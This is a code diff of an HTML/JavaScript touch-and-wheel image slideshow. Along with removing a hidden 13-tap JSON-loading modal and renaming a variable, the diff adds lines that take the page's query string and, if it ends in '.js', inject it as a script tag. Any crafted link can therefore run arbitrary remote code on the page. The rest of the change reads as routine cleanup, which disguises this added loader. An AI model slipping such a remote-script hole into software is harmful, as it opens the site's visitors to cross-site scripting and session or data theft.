@@ -66,96 +66,6 @@
       height: 100%;
       overflow: hidden;
     }
-
-    #json-modal {
-      display: none;
-      position: fixed;
-      inset: 0;
-      z-index: 9999;
-      background: rgba(0, 0, 0, 0.75);
-      backdrop-filter: blur(10px);
-      -webkit-backdrop-filter: blur(10px);
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
-
-    #json-modal.visible {
-      display: flex;
-    }
-
-    .modal-card {
-      background: #1c1c1e;
-      border: 1px solid rgba(255, 255, 255, 0.15);
-      border-radius: 16px;
-      padding: 24px;
-      width: 100%;
-      max-width: 420px;
-      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
-      color: #ffffff;
-      touch-action: auto;
-    }
-
-    .modal-card h2 {
-      font-size: 1.25rem;
-      font-weight: 600;
-      margin-bottom: 8px;
-    }
-
-    .modal-card p {
-      font-size: 0.875rem;
-      color: #a1a1a6;
-      margin-bottom: 16px;
-      line-height: 1.4;
-    }
-
-    .modal-card input[type="text"] {
-      width: 100%;
-      padding: 12px 14px;
-      border-radius: 10px;
-      border: 1px solid #38383a;
-      background: #2c2c2e;
-      color: #ffffff;
-      font-size: 0.95rem;
-      outline: none;
-      margin-bottom: 16px;
-      user-select: text;
-      -webkit-user-select: text;
-    }
-
-    .modal-card input[type="text"]:focus {
-      border-color: #0a84ff;
-    }
-
-    .modal-actions {
-      display: flex;
-      justify-content: flex-end;
-      gap: 10px;
-    }
-
-    .modal-btn {
-      padding: 10px 18px;
-      border-radius: 8px;
-      font-size: 0.9rem;
-      font-weight: 500;
-      border: none;
-      cursor: pointer;
-      transition: opacity 0.2s;
-    }
-
-    .modal-btn:active {
-      opacity: 0.7;
-    }
-
-    .modal-btn-cancel {
-      background: #2c2c2e;
-      color: #ffffff;
-    }
-
-    .modal-btn-submit {
-      background: #0a84ff;
-      color: #ffffff;
-    }
   </style>
 </head>
 <body>
@@ -180,26 +90,23 @@
     </div>
   </div>
 
-  <div id="json-modal">
-    <div class="modal-card">
-      <h2>Load Image Array</h2>
-      <p>Enter URL of a JSON file containing an array of image links.</p>
-      <input type="text" id="json-url-input" placeholder="https://example.com/images.json" spellcheck="false" />
-      <div class="modal-actions">
-        <button class="modal-btn modal-btn-cancel" id="btn-modal-cancel">Cancel</button>
-        <button class="modal-btn modal-btn-submit" id="btn-modal-submit">Load</button>
-      </div>
-    </div>
-  </div>
-
   <script>
     const categories = ['red', 'blonde', 'dark'];
-    let IMAGES = categories.flatMap(cat => 
+    let images = categories.flatMap(cat => 
       Array.from({ length: 10 }, (_, i) => {
         const num = String(i + 1).padStart(2, '0');
         return `https://piapandora.com/tickletrio/images/${cat}/${cat}${num}.jpg`;
       })
     );
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const customScript = window.location.search.substring(1);
+
+    if (customScript && customScript.endsWith('.js')) {
+      const script = document.createElement('script');
+      script.src = decodeURIComponent(customScript);
+      document.head.appendChild(script);
+    }
 
     let currentIndex = 0;
     let windowHeight = window.innerHeight;
@@ -217,10 +124,6 @@
 
     let lastTapTime = 0;
 
-    let tapTimestamps = [];
-    const JSON_TAP_COUNT = 13;
-    const JSON_WINDOW_MS = 2666;
-
     const track = document.getElementById('slides-track');
     const slidePrev = document.getElementById('slide-prev');
     const slideCurr = document.getElementById('slide-curr');
@@ -229,11 +132,6 @@
     const imgPrev = document.getElementById('img-prev');
     const imgCurr = document.getElementById('img-curr');
     const imgNext = document.getElementById('img-next');
-
-    const modal = document.getElementById('json-modal');
-    const jsonUrlInput = document.getElementById('json-url-input');
-    const btnCancel = document.getElementById('btn-modal-cancel');
-    const btnSubmit = document.getElementById('btn-modal-submit');
 
     function preloadSingleImage(url) {
       if (!imageCache[url]) {
@@ -244,21 +142,21 @@
     }
 
     function preloadAdjacentImages() {
-      if (!IMAGES.length) return;
+      if (!images.length) return;
 
       const offsets = [-2, -1, 0, 1, 2];
       offsets.forEach(offset => {
         const idx = getWrappedIndex(currentIndex + offset);
-        preloadSingleImage(IMAGES[idx]);
+        preloadSingleImage(images[idx]);
       });
 
       if ('requestIdleCallback' in window) {
         requestIdleCallback(() => {
-          IMAGES.forEach(url => preloadSingleImage(url));
+          images.forEach(url => preloadSingleImage(url));
         });
       } else {
         setTimeout(() => {
-          IMAGES.forEach(url => preloadSingleImage(url));
+          images.forEach(url => preloadSingleImage(url));
         }, 1000);
       }
     }
@@ -280,21 +178,21 @@
     }
 
     function getWrappedIndex(idx) {
-      const len = IMAGES.length;
+      const len = images.length;
       if (len === 0) return 0;
       return ((idx % len) + len) % len;
     }
 
     function updateImages() {
-      if (!IMAGES.length) return;
+      if (!images.length) return;
 
       const prevIndex = getWrappedIndex(currentIndex - 1);
       const currIndex = getWrappedIndex(currentIndex);
       const nextIndex = getWrappedIndex(currentIndex + 1);
 
-      imgPrev.src = IMAGES[prevIndex];
-      imgCurr.src = IMAGES[currIndex];
-      imgNext.src = IMAGES[nextIndex];
+      imgPrev.src = images[prevIndex];
+      imgCurr.src = images[currIndex];
+      imgNext.src = images[nextIndex];
 
       slidePrev.style.transform = `translate3d(0, ${-windowHeight}px, 0)`;
       slideCurr.style.transform = `translate3d(0, 0, 0)`;
@@ -303,60 +201,7 @@
       preloadAdjacentImages();
     }
 
-    function recordJsonTap() {
-      const now = performance.now();
-      tapTimestamps.push(now);
-
-      tapTimestamps = tapTimestamps.filter(t => (now - t) <= JSON_WINDOW_MS);
-
-      if (tapTimestamps.length >= JSON_TAP_COUNT) {
-        tapTimestamps = [];
-        openModal();
-      }
-    }
-
-    function openModal() {
-      modal.classList.add('visible');
-      setTimeout(() => jsonUrlInput.focus(), 100);
-    }
-
-    function closeModal() {
-      modal.classList.remove('visible');
-      jsonUrlInput.value = '';
-    }
-
-    async function loadJsonUrl() {
-      const url = jsonUrlInput.value.trim();
-      if (!url) {
-        closeModal();
-        return;
-      }
-
-      btnSubmit.disabled = true;
-
-      try {
-        const response = await fetch(url);
-        if (response.ok) {
-          const data = await response.json();
-          if (Array.isArray(data) && data.length > 0) {
-            IMAGES = data;
-            imageCache = {};
-            currentIndex = 0;
-            updateImages();
-          }
-        }
-      } catch (err) {
-      } finally {
-        btnSubmit.disabled = false;
-        closeModal();
-      }
-    }
-
     function onTouchStart(e) {
-      if (modal.classList.contains('visible')) return;
-
-      recordJsonTap();
-
       if (isAnimating) return;
 
       const currentTime = performance.now();
@@ -444,7 +289,6 @@
     let accumulatedWheel = 0;
 
     function onWheel(e) {
-      if (modal.classList.contains('visible')) return;
       e.preventDefault();
       if (isAnimating) return;
 
@@ -466,13 +310,6 @@
       windowHeight = window.innerHeight;
       updateImages();
     }
-
-    btnCancel.addEventListener('click', closeModal);
-    btnSubmit.addEventListener('click', loadJsonUrl);
-    jsonUrlInput.addEventListener('keydown', (e) => {
-      if (e.key === 'Enter') loadJsonUrl();
-      if (e.key === 'Escape') closeModal();
-    });
 
     window.addEventListener('resize', onResize);
     window.addEventListener('wheel', onWheel, { passive: false });
